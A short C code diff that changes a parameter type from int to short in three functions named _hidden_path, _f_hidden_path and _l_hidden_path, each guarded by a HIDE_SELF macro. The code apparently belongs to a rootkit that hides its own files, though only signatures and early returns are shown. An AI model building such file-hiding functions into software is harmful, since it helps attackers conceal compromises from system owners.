@@ -1,4 +1,4 @@
-int _hidden_path(const char *pathname, int mode){
+int _hidden_path(const char *pathname, short mode){
 #ifndef HIDE_SELF
     return 0;
 #endif
@@ -8,7 +8,7 @@ int _hidden_path(const char *pathname, int mode){
     return 0;
 }
 
-int _f_hidden_path(int fd, int mode){
+int _f_hidden_path(int fd, short mode){
 #ifndef HIDE_SELF
     return 0;
 #endif
@@ -17,7 +17,7 @@ int _f_hidden_path(int fd, int mode){
     return 0;
 }
 
-int _l_hidden_path(const char *pathname, int mode){
+int _l_hidden_path(const char *pathname, short mode){
 #ifndef HIDE_SELF
     return 0;
 #endif
